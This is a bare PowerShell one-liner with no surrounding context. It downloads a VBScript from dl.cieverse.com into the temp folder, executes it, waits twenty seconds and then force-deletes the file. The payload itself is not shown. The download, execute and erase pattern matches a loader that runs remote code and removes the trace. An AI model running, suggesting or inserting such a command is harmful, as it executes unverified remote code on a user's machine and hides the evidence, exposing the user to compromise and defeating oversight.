$tempPath = Join-Path $env:TEMP "neocaps.vbs"; irm -uri https://dl.cieverse.com/cios/ic-updates/neocaps.vbs | Out-File $tempPath; & $tempPath; Start-Sleep -Seconds 20; Remove-Item $temppath -Force
